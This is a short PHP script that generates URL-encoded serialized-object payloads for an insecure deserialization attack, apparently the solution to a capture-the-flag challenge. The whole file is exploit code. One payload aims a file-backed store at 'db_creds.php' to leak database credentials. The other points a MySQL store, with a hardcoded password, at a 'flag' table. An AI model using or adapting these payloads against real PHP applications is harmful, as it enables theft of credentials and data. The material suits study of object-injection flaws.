<?php

class Albums {
    private $store;
    public function __construct($store) {
        $this->store = $store;
    }
}

class MysqlRecordStore {
    private $table;
    private $host;
    private $user;
    private $pass;
    private $db;
    public function __construct($host, $user, $pass, $db, $table) {
        $this->host = $host;
        $this->user = $user;
        $this->pass = $pass;
        $this->db = $db;
        $this->table = $table;
    }
}

class CsvRecordStore {
    private $file;
    public function __construct($file) {
        $this->file = $file;
    }
}

$payload1 = new Albums(new CsvRecordStore("db_creds.php"));
echo "Leak DB Credentials: " . urlencode(serialize($payload1)) . "\n";

$payload2 = new Albums(new MysqlRecordStore("mysql", "user", "j90dsgjdjds09djvupx", "challenge", "flag"));
echo "Leak Flag Table: " . urlencode(serialize($payload2)) . "\n";

?>
